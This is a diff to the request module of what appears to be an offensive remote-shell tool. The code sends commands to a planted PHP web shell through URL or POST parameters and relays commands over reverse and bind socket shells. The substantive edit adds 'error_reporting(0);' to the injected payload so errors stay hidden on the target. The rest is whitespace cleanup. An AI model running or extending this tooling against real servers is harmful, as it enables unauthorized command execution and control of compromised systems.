@@ -53,8 +53,8 @@ class MakeRequest(object):
         if result:
             command = self.cmd.replace('sudo', '{0}sudo{1}'.format('\033[91m', '\033[93m'))
             errmsg = colored('\n[!] Warning this command ({0}) could break the connection. I\'m not going to allow it to be sent'.format(command), 'red')
-            cprint(errmsg, 'red')            
-            
+            cprint(errmsg, 'red')
+
         elif getargs.url:
             # Proxy support
             proxy_support = ProxyHandler({'http': self.proxy} if self.proxy else {})
@@ -75,9 +75,9 @@ class MakeRequest(object):
             # Check if the method is POST
             if self.method == 'post' or self.parameter:
                 self.method = 'post'
-                parameters = urlencode({self.parameter: 'echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'})
+                parameters = urlencode({self.parameter: 'error_reporting(0);echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'})
                 try:
-                    sc = map(str.rstrip, opener.open(self.url, parameters).readlines()) 
+                    sc = map(str.rstrip, opener.open(self.url, parameters).readlines())
                     sc =  '::command_deli::'.join(sc)
                     sc = re.search('::command_start::(.+)::command_end::', sc)
                     if sc:
@@ -94,7 +94,7 @@ class MakeRequest(object):
             # If the used method set GET
             else:
                 try:
-                    sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote('echo ::command_start::;' +self.cmd.strip(';')+';echo ::command_end::;'))).readlines())
+                    sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote('error_reporting(0);echo ::command_start::;' +self.cmd.strip(';')+';echo ::command_end::;'))).readlines())
                     sc =  '::command_deli::'.join(sc)
                     sc = re.search('::command_start::(.+)::command_end::', sc)
                     if sc:
@@ -115,10 +115,10 @@ class MakeRequest(object):
                     errmsg = colored('\n[!] Error in sending data (#1)', 'red')
                     cprint(errmsg, 'red')
                 time.sleep(0.1)
-                                
+
                 sc = ''
                 buffer = listen.socket.recv(1024)
-                
+
                 if buffer == '':
                     errmsg = colored('\n[!] Lost connection. Exiting...', 'red')
                     cprint(errmsg, 'red')
@@ -137,33 +137,33 @@ class MakeRequest(object):
                     cprint(errmsg, 'red')
                 pass
         elif getargs.connect:
-            try:    
+            try:
                 if (connect.socket.send(cmd + "\n") == None):
                     errmsg = colored('\n[!] Error in sending data (#1)', 'red')
                     cprint(errmsg, 'red')
                 time.sleep(0.1)
-                                
+
                 sc = ''
                 buffer = connect.socket.recv(1024)
-                
+
                 if buffer == '':
                     errmsg = colored('\n[!] Lost connection. Exiting...', 'red')
                     cprint(errmsg, 'red')
                     connect.socket.close()
                     exit(1)
                 while buffer != '':
-                    sc = sc + buffer 
+                    sc = sc + buffer
                     try:
                         buffer = connect.socket.recv(1024)
                     except:
                         buffer = ''
-                
+
                 return sc.split('\n')[:-1]
             except:
-                pass         
+                pass
         else:
             errmsg = colored('\n[!] Unsupported mode!', 'red')
-            cprint(errmsg, 'red')        
-            exit(1)             
+            cprint(errmsg, 'red')
+            exit(1)
 
 make_request = MakeRequest()
